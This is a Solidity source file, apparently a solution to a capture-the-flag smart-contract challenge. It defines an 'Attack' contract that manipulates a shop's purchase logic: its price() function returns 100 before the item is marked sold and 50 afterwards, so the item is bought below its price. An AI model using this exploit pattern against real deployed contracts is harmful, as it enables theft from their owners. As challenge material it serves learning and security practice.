// SPDX-License-Identifier: UNLICENSED
pragma solidity "0.8.19";

interface IShop {
    function price() external returns (uint256);

    function isSold() external returns (bool);

    function buy() external;
}

contract Attack {
    IShop shop;

    constructor(address _target) {
        shop = IShop(_target);
    }

    function price() external returns (uint256) {
        if (!shop.isSold()) {
            return uint256(100); // first call
        } else {
            return uint256(50); // second call
        }
    }

    function buyItem() external {
        shop.buy();
    }
}
